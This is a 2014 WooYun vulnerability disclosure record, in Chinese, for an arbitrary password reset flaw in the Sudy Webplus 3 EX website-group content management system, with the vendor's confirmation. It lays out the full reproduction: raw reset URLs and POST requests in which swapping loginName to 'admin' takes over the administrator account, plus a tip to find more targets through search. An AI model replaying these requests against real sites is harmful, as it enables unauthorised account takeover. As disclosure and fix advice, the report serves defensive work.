{"id": 1458, "wybug_id": "wooyun-2014-064788", "wybug_title": "苏迪Webplus 3 EX网站群内容管理系统任意用户密码重置", "wybug_corp": "苏迪科技", "wybug_author": "路人甲", "wybug_date": "2014-06-13 17:09", "wybug_open_date": "2014-09-11 17:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-11：\t细节向公众公开  简要描述： 南京苏迪科技Webplus 3 EX网站群内容管理系统存在任意用户密码重置问题； 详细说明：  苏迪科技Webplus 3 EX网站群内容管理系统，用户密码找回功能存在设计缺陷，导致任意用户密码重置。测试操作如下：1.由于我们没有测试账号，因此需要先注册一个账号：（注册地址默认是不公开的，让人找得好辛苦啊！~~~）http://www.ceshizhandian.edu.cn/_web/ids/userRegister.do?_p=YXM9MSZwPTEmbT1OJg__\n\n一定要填写：密保问题和密保答案哟！2. 找回密码：http://www.ceshizhandian.edu.cn//_web/ids/initPasswordRecoveryApply.do?_p=YXM9MSZ0PTAmcD0xJm09TiY_&t=0.3189659991047933\n\n密码类型选择“密保问题”3. 回答密保问题\n\n下一步：出现这样一个linkhttp://www.ceshizhandian.edu.cn/_web/ids/passwordRecoveryApplyResetPassword.do?_p=YXM9MSZ0PTAmcD0xJm09TiY_&key=27b09e73-8b7d-4575-aed5-aad9fb28478a特别需要注意的是key 27b09e73-8b7d-4575-aed5-aad9fb28478a当然了，你此时可以用Fiddle记录一下，重置test1用户的提交数据内容，你可以发现提交的link是这样的：http://www.ceshizhandian.edu.cn/_web/ids/resetNewPasswordRecoveryApply.do?loginName=test1&key=27b09e73-8b7d-4575-aed5-aad9fb28478a&_p=YXM9MSZ0PTAmcD0xJm09TiY_\nPOST 提交：Accept: text/html, application/xhtml+xml, */*Referer: http://www.ceshizhandian.edu.cn/_web/ids/passwordRecoveryApplyResetPassword.do?_p=YXM9MSZ0PTAmcD0xJm09TiY_&key=27b09e73-8b7d-4575-aed5-aad9fb28478aAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoContent-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: www.ceshizhandian.edu.cnContent-Length: 40Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=6A7CA28760FC74156AC23F20AE72524B; validateImageValue=4963\n提交内容：newPassword=sexsex11&rePassword=sexsex11如果将loginName=test1换成loginName=admin是否可以修改admin用户的密码？答案是肯定滴！   漏洞证明：  4. 重新为test1用户做一次密码找回，在第三步时记录url的key值   在Fiddle中修改：\nhttp://www.ceshizhandian.edu.cn/_web/ids/resetNewPasswordRecoveryApply.do?loginName=admin&key=新的key值&_p=YXM9MSZ0PTAmcD0xJm09TiY_POST 提交：Accept: text/html, application/xhtml+xml, */*Referer: http://www.ceshizhandian.edu.cn/_web/ids/passwordRecoveryApplyResetPassword.do?_p=YXM9MSZ0PTAmcD0xJm09TiY_&key=新的key值Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoContent-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: www.ceshizhandian.edu.cnContent-Length: 40Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=6A7CA28760FC74156AC23F20AE72524B; validateImageValue=4963\n提交内容：newPassword=sexsex11&rePassword=sexsex11提交之后，使用admin用户的新密码登录http://www.ceshizhandian.edu.cn/login.jsp?_p=YXM9MTkmcD0xJm09TiY_\n\n使用www.so.com搜索关键字 WebPlus 3 Ex【网站群内容管理系统】可以找到不少的测试目标，如海洋大学：\n\n   修复方案：  1.关闭注册功能；2.关闭密码找回功能；3.增加验证条件，判断token与用户名或者用户ID的关系；   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-13 19:37 厂商回复： 问题已经确认，正在对所有项目进行升级，感谢作者对产品关注和贡献 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-13 19:22 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  最后一步的验证漏洞    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}